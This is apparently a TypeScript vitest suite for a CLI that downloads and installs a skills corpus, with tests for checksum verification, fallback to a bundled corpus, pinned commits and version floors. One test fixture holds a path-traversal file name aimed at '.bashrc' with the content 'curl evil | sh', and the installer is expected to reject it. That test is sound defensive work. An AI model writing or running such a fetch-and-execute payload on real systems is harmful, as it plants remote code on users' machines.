import { createHash } from "node:crypto";
import { gzipSync } from "node:zlib";

import { describe, expect, it } from "vitest";

import { SKILLS_NEXUS_SHA } from "../skills-content.generated";
import { PlatformCorpusError, type PlatformIo } from "./platform";
import { normalizeSkillsRef, resolveInstallCorpus } from "./resolve";

const BASE = "https://api.test.example";
const LATEST = "1".repeat(40);
const PINNED = "2".repeat(40);

interface Published {
  commitSha: string;
  minCliVersion?: string | null;
  files?: { path: string; content: string }[];
  /** Serve these bytes as the corpus instead of the real gzip. */
  tamperedCorpus?: Buffer;
}

/** A fake platform: the manifest and corpus routes for each published commit, and a call log. */
function platform(published: Published[], latest: string | null, cliVersion = "1.5.0") {
  const calls: string[] = [];
  const releases = new Map(
    published.map((p) => {
      const corpus = {
        schemaVersion: 1,
        commitSha: p.commitSha,
        minCliVersion: p.minCliVersion ?? null,
        files: p.files ?? [
          { path: "skills/nexus-a/SKILL.md", content: "# A\n\nFrom the platform." },
          { path: "hooks/guard.py", content: "#!/usr/bin/env python3\n" },
          { path: "CLAUDE.md", content: "root" }
        ]
      };
      const gzip = gzipSync(Buffer.from(JSON.stringify(corpus)));
      const manifest = {
        schemaVersion: 1,
        commitSha: p.commitSha,
        sha256: createHash("sha256").update(gzip).digest("hex"),
        size: gzip.length,
        minCliVersion: p.minCliVersion ?? null,
        publishedAt: "2026-09-14T00:00:00.000Z"
      };
      return [p.commitSha, { manifest, served: p.tamperedCorpus ?? gzip }];
    })
  );

  const respond: typeof fetch = async (input) => {
    const url = String(input);
    calls.push(url.replace(BASE, ""));
    const json = (body: unknown) => new Response(JSON.stringify(body), { status: 200 });
    if (url === `${BASE}/api/cli/skills/manifest`) {
      const release = latest === null ? undefined : releases.get(latest);
      return release
        ? json({ success: true, data: release.manifest })
        : new Response("{}", { status: 404 });
    }
    const match = /\/api\/cli\/skills\/([0-9a-f]{40})\/(manifest|corpus)$/.exec(url);
    const release = match ? releases.get(match[1]) : undefined;
    if (!match || !release) return new Response("{}", { status: 404 });
    return match[2] === "manifest"
      ? json({ success: true, data: release.manifest })
      : new Response(release.served, { status: 200 });
  };

  const io: PlatformIo = { baseUrl: BASE, cliVersion, fetch: respond, globals: {} };
  return { io, calls };
}

const failingIo = (error: Error): PlatformIo => ({
  baseUrl: BASE,
  cliVersion: "1.5.0",
  fetch: async () => {
    throw error;
  },
  globals: {}
});

describe("resolveInstallCorpus — the default: the platform's latest", () => {
  it("installs the latest corpus, built from what the platform served", async () => {
    const { io, calls } = platform([{ commitSha: LATEST }], LATEST);
    const resolved = await resolveInstallCorpus({}, io);

    expect(resolved.source).toBe("platform");
    expect(resolved.fallbackReason).toBeNull();
    expect(resolved.warnings).toEqual([]);
    expect(resolved.corpus.commitSha).toBe(LATEST);
    expect(resolved.corpus.skillList).toEqual(["nexus-a"]);
    expect(resolved.corpus.skills["nexus-a"].description).toBe("From the platform.");
    expect(calls).toEqual(["/api/cli/skills/manifest", `/api/cli/skills/${LATEST}/corpus`]);
  });

  it.each([
    ["offline", failingIo(new TypeError("fetch failed")), /could not reach/],
    [
      "timed out",
      failingIo(Object.assign(new Error("t"), { name: "TimeoutError" })),
      /did not answer within 5s/
    ]
  ])(
    "falls back to the bundled corpus when the platform is %s, and says why",
    async (_label, io, reason) => {
      const resolved = await resolveInstallCorpus({}, io);
      expect(resolved.source).toBe("bundled");
      expect(resolved.corpus.commitSha).toBe(SKILLS_NEXUS_SHA);
      expect(resolved.fallbackReason).toMatch(reason);
      expect(resolved.warnings.join("\n")).toMatch(/Installing the skills bundled with this CLI/);
    }
  );

  it("falls back when nothing has been published yet", async () => {
    const { io } = platform([], null);
    const resolved = await resolveInstallCorpus({}, io);
    expect(resolved.source).toBe("bundled");
    expect(resolved.fallbackReason).toMatch(/has not been published/);
  });

  it("REFUSES a corpus whose bytes do not match the manifest's sha256, and falls back", async () => {
    const tampered = gzipSync(Buffer.from(JSON.stringify({ evil: true })));
    const { io } = platform([{ commitSha: LATEST, tamperedCorpus: tampered }], LATEST);
    const resolved = await resolveInstallCorpus({}, io);
    expect(resolved.source).toBe("bundled");
    expect(resolved.fallbackReason).toMatch(/does not match its checksum/);
  });

  it("refuses a corpus that names a path outside the install target", async () => {
    const { io } = platform(
      [{ commitSha: LATEST, files: [{ path: "hooks/../../.bashrc", content: "curl evil | sh" }] }],
      LATEST
    );
    const resolved = await resolveInstallCorpus({}, io);
    expect(resolved.source).toBe("bundled");
    expect(resolved.fallbackReason).toMatch(/unsafe path: hooks\/\.\.\/\.\.\/\.bashrc/);
  });

  it("does not install a corpus written for a newer CLI, and tells the user to upgrade", async () => {
    const { io, calls } = platform(
      [{ commitSha: LATEST, minCliVersion: "2.0.0" }],
      LATEST,
      "1.5.0"
    );
    const resolved = await resolveInstallCorpus({}, io);

    expect(resolved.source).toBe("bundled");
    expect(resolved.fallbackReason).toBe("the latest skills need CLI 2.0.0 or newer");
    expect(resolved.warnings[0]).toMatch(/written for CLI 2\.0\.0 or newer, and this is 1\.5\.0/);
    expect(resolved.warnings[0]).toMatch(/nexus upgrade/);
    // The floor is read from the manifest, so the corpus is never downloaded.
    expect(calls).toEqual(["/api/cli/skills/manifest"]);
  });

  it("installs a corpus whose floor this CLI meets", async () => {
    const { io } = platform([{ commitSha: LATEST, minCliVersion: "1.5.0" }], LATEST, "1.5.0");
    const resolved = await resolveInstallCorpus({}, io);
    expect(resolved.source).toBe("platform");
    expect(resolved.minCliVersion).toBe("1.5.0");
  });
});

describe("resolveInstallCorpus — --bundled and --skills-ref", () => {
  it("--bundled makes no network call at all", async () => {
    const { io, calls } = platform([{ commitSha: LATEST }], LATEST);
    const resolved = await resolveInstallCorpus({ bundled: true }, io);
    expect(resolved.source).toBe("bundled");
    expect(resolved.fallbackReason).toBeNull();
    expect(resolved.corpus.commitSha).toBe(SKILLS_NEXUS_SHA);
    expect(calls).toEqual([]);
  });

  it("--skills-ref installs exactly that commit, even when it is not the latest", async () => {
    const { io, calls } = platform([{ commitSha: LATEST }, { commitSha: PINNED }], LATEST);
    const resolved = await resolveInstallCorpus({ skillsRef: PINNED }, io);
    expect(resolved.source).toBe("pinned");
    expect(resolved.corpus.commitSha).toBe(PINNED);
    expect(calls).toEqual([
      `/api/cli/skills/${PINNED}/manifest`,
      `/api/cli/skills/${PINNED}/corpus`
    ]);
  });

  it("--skills-ref NEVER falls back: an unpublished commit is an error", async () => {
    const { io } = platform([{ commitSha: LATEST }], LATEST);
    await expect(resolveInstallCorpus({ skillsRef: PINNED }, io)).rejects.toMatchObject({
      name: "PlatformCorpusError",
      failure: "not-found"
    });
  });

  it("--skills-ref NEVER falls back: an unreachable platform is an error", async () => {
    await expect(
      resolveInstallCorpus({ skillsRef: PINNED }, failingIo(new TypeError("fetch failed")))
    ).rejects.toBeInstanceOf(PlatformCorpusError);
  });

  it("--skills-ref installs a commit written for a newer CLI, with the upgrade warning", async () => {
    const { io } = platform([{ commitSha: PINNED, minCliVersion: "9.0.0" }], null, "1.5.0");
    const resolved = await resolveInstallCorpus({ skillsRef: PINNED }, io);
    expect(resolved.source).toBe("pinned");
    expect(resolved.warnings[0]).toMatch(/nexus upgrade/);
  });

  it.each([
    [PINNED.toUpperCase(), PINNED],
    [` ${PINNED} `, PINNED],
    [PINNED.slice(0, 12), null],
    ["main", null]
  ])("normalizes --skills-ref %j to %j", (input, expected) => {
    expect(normalizeSkillsRef(input)).toBe(expected);
  });
});
